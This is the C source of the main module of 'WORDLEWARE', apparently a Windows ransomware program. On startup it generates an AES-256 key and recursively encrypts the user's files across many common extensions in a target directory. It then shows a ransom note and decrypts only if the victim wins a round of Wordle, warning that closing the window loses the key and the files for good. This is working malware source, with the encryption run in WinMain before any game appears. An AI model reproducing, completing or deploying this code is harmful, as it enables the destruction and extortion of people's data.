#include "Controls.h"
#include "GameLogic.h"

#pragma comment(lib, "Comctl32.lib")

#define SUBCLASS_ID 101
#define ENTER_GUESS 10
#define WINDOW_WIDTH 600
#define WINDOW_HEIGHT 600

const char g_szClassName[] = "windowClass";
WCHAR listOfFileExtensions[] = L".jpg.txt.ppt.zip.7z.pdf.docx.PNG.png.log.xlsx.flac.mp4.mp3.c.gif.doc.pptx.wav.js.avi.cpp.dat.raw.json.java.class.xml.html.dll";

WNDCLASSEX wc;
HWND mainHWND;
HWND buttonHWND;

HWND inputBoxes[6][5];

MSG msg;
HFONT hFont;
HFONT hHeaderFont;
HFONT hHeader2Font;
HFONT hInputFont;
DWORD currentLine;

FILE* fileToOpen = NULL;
char** listOfValidWords = NULL;
char** listOfAnswerWords = NULL;
char* randomWord = NULL;
WCHAR* targetDirectory;

bool ransomPaid = FALSE;

HCRYPTPROV hCryptProv = NULL;
HCRYPTKEY hKey = NULL;

void AddNote(HWND hwnd);
void AddButton(HWND hwnd);
void InitializeInputBoxes(HWND hwnd);
void initWNDCLASS(HINSTANCE hInstance);
void createMainWindow(HINSTANCE hInstance);
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK SubWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
WNDPROC editDefProc;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    //Encryption Set up
    if (!CryptAcquireContext(&hCryptProv,
                             NULL,
                             NULL,
                             PROV_RSA_AES,
                             0)) {
        MessageBox(NULL, L"Failed to acquire key", NULL, NULL);
    }

    if (!CryptGenKey(hCryptProv,
                     CALG_AES_256,
                     0,
                     &hKey)) {
        MessageBox(NULL, L"Failed to generate key", NULL, NULL);
    }

    targetDirectory = calloc(MAX_PATH, sizeof(WCHAR));

    GetTargetDirectory(targetDirectory);

    RecursiveDirSearch(targetDirectory, listOfFileExtensions, hKey, ransomPaid);

    initWNDCLASS(hInstance);

    createMainWindow(hInstance);

    ShowWindow(mainHWND, nCmdShow);
    UpdateWindow(mainHWND);

    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

void AddNote(HWND hwnd) {
    HWND headerHWND;
    HWND header2HWND;
    HWND textHWND;

    hHeaderFont = SetHeaderFontAttributes();
    hHeader2Font = SetHeader2FontAttributes();
    hFont = SetFontAttributes();

    headerHWND = CreateWindow(L"static", L"ATTENTION!", WS_VISIBLE | WS_CHILD, (WINDOW_WIDTH / 7), (WINDOW_HEIGHT / 28), 230, 40, hwnd, NULL, NULL, NULL);
    SendMessage(headerHWND, WM_SETFONT, (WPARAM)hHeaderFont, TRUE);

    textHWND = CreateWindow(L"static", L"Your system has been encrypted by WORDLEWARE. Don't bother trying to decrypt the files yourself, they were encrypted using the Advanced Encryption Standard with a key size of 256 bits.", WS_VISIBLE | WS_CHILD, (WINDOW_WIDTH / 1.62f), (WINDOW_HEIGHT / 20), 200, 200, hwnd, NULL, NULL, NULL);
    SendMessage(textHWND, WM_SETFONT, (WPARAM)hFont, TRUE);

    header2HWND = CreateWindow(L"static", L"BUT DON'T WORRY!", WS_VISIBLE | WS_CHILD, (WINDOW_WIDTH / 1.62f), (WINDOW_HEIGHT / 3.0f), 200, 20, hwnd, NULL, NULL, NULL);
    SendMessage(header2HWND, WM_SETFONT, (WPARAM)hHeader2Font, TRUE);

    textHWND = CreateWindow(L"static", L"You don't need to pay me to get your files back. Instead, I want you to play a game. Win a round of Wordle, and WORDLEWARE will begin decrypting your precious data!", WS_VISIBLE | WS_CHILD, (WINDOW_WIDTH / 1.62f), (WINDOW_HEIGHT / 2.6f), 200, 200, hwnd, NULL, NULL, NULL);

    header2HWND = CreateWindow(L"static", L"Good Luck!", WS_VISIBLE | WS_CHILD, (WINDOW_WIDTH / 1.62f), (WINDOW_HEIGHT / 1.65f), 250, 50, hwnd, NULL, NULL, NULL);
    SendMessage(header2HWND, WM_SETFONT, (WPARAM)hHeader2Font, TRUE);


    SendMessage(textHWND, WM_SETFONT, (WPARAM)hFont, TRUE);
}

void AddButton(HWND hwnd) {
    buttonHWND = CreateWindow(L"button", L"Enter Guess", WS_VISIBLE | WS_CHILD, (WINDOW_WIDTH / 1.52), (WINDOW_HEIGHT / 1.45), 150, 75, hwnd, (HMENU)ENTER_GUESS, NULL, NULL);
    hHeader2Font = SetHeader2FontAttributes();
    SendMessage(buttonHWND, WM_SETFONT, (WPARAM)hHeader2Font, TRUE);
}

void InitializeInputBoxes(HWND hwnd) {
    hInputFont = SetInputFontAttributes();
    for (DWORD i = 0; i < 6; i++) {
        for (DWORD j = 0; j < 5; j++) {
            inputBoxes[i][j] = CreateWindow(L"edit", L"", WS_VISIBLE | WS_CHILD | EM_LIMITTEXT, (WINDOW_WIDTH / 11.6f) + 60 * j, (WINDOW_HEIGHT / 8.0f) + 70 * i, 50, 40, hwnd, NULL, NULL, NULL);
            SendMessage(inputBoxes[i][j], EM_LIMITTEXT, 1, 0); //limit size of textbox to 1 character
            SendMessage(inputBoxes[i][j], WM_SETFONT, (WPARAM)hInputFont, TRUE);
            editDefProc = (WNDPROC)SetWindowLongPtr(inputBoxes[i][j], GWLP_WNDPROC, (LPARAM)SubWndProc);

            if (i != 0) {
                SendMessage(inputBoxes[i][j], EM_SETREADONLY, 1, NULL);
            }
        }
    }
    SetFocus(inputBoxes[0][0]);
    currentLine = 0;
}

void initWNDCLASS(HINSTANCE hInstance) {
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassEx(&wc)) {
        MessageBox(NULL,
            L"Window Registration Failed!",
            L"Error!",
            MB_ICONEXCLAMATION | MB_OK);
        return;
    }
}

void createMainWindow(HINSTANCE hInstance) {
    mainHWND = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        g_szClassName,
        L"WORDLEWARE",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, WINDOW_WIDTH, WINDOW_HEIGHT,
        NULL, NULL, hInstance, NULL);

    if (mainHWND == NULL) {
        MessageBox(NULL,
            L"Window Creation Failed!",
            L"Error!",
            MB_ICONEXCLAMATION | MB_OK);
        return;
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    bool gameEnd = FALSE;
    HBRUSH hBrush = NULL;
    char* guess = NULL;
    bool readFromValidAnswersList = TRUE;

    switch (msg) {

    case WM_CREATE: {
        listOfAnswerWords = LoadWords(readFromValidAnswersList); //list of valid words differ greatly from list of words that can be answers
        randomWord = GetRandomWord(listOfAnswerWords);

        readFromValidAnswersList = FALSE;
        listOfValidWords = LoadWords(readFromValidAnswersList);

        AddNote(hwnd);
        InitializeInputBoxes(hwnd);
        AddButton(hwnd);
        break;
    }

    case WM_CTLCOLORSTATIC: { //colour each textbox with appropriate colour depending on guess
        HDC hdcEdit = (HDC)wParam;
        DWORD ID = 0;
        ID = GetDlgCtrlID(lParam);

        if (ID == NO_MATCH) {
            SetBkColor(hdcEdit, RGB(255, 115, 115));
        }
        if (ID == PARTIAL_MATCH) {
            SetBkColor(hdcEdit, RGB(245, 255, 95));
        }
        if (ID == FULL_MATCH) {
            SetBkColor(hdcEdit, RGB(115, 255, 95));
        }

        return (LRESULT)hBrush;
    }

    case WM_COMMAND: {
        switch (wParam) {
        case ENTER_GUESS: {
            guess = GetGuess(inputBoxes, currentLine);

            if (!ValidateGuess(guess, listOfValidWords)) {
                MessageBox(NULL, L"Invalid Word!", L"Error!", NULL);
                break;
            }

            gameEnd = CheckGuess(inputBoxes, currentLine, randomWord);

            currentLine++;
            MoveToNextGuess(inputBoxes, currentLine);

            if (!gameEnd && currentLine > 5) {
                char lossMessage[128] = "You Lost! The answer was: ";
                strcat(lossMessage, randomWord);
                MessageBoxA(NULL, lossMessage, "You Lost!", NULL);

                randomWord = GetRandomWord(listOfAnswerWords);
                ResetGame(inputBoxes);

                currentLine = 0;
                SetFocus(inputBoxes[0][0]);
            }

            if (gameEnd) {
                //disable text boxes for current guess so they are drawn green
                for (DWORD i = 0; i < 5; i++) {
                    SendMessage(inputBoxes[currentLine][i], EM_SETREADONLY, 1, NULL);
                }
                //disable "Enter Guess" button
                EnableWindow(buttonHWND, 0);

                ransomPaid = TRUE;
                MessageBox(NULL, L"Congratulations. Close this message box to begin decrypting your files. The program will close automatically when everything is done decrypting.", L"You win!", NULL);
                RecursiveDirSearch(targetDirectory, listOfFileExtensions, hKey, ransomPaid);

                PostQuitMessage(0);
            }

            if (guess) {
                free(guess);
            }
            break;
        }
        }
        break;
    }
    case WM_CLOSE:
        if (!ransomPaid) {
            if (MessageBox(NULL,
                L"This program does not save the encryption key. Closing it will cause the key to be lost, causing your files to be permanently lost. Proceed?",
                L"WARNING!",
                MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) == 6) {
                DestroyWindow(hwnd);
            }
            break;
            DestroyWindow(hwnd);
        }
    case WM_DESTROY:
        if (hBrush) {
            DeleteObject(hBrush);
        }

        free(listOfValidWords);
        free(listOfAnswerWords);
        free(targetDirectory);

        PostQuitMessage(0);

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return;
}

LRESULT CALLBACK SubWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {

    case WM_KEYUP:
        if (wParam == VK_BACK) {
            Backspace(inputBoxes, currentLine);
            break;
        }

        MoveFocus(inputBoxes, currentLine);
        break;

    }

    return editDefProc(hwnd, msg, wParam, lParam);
}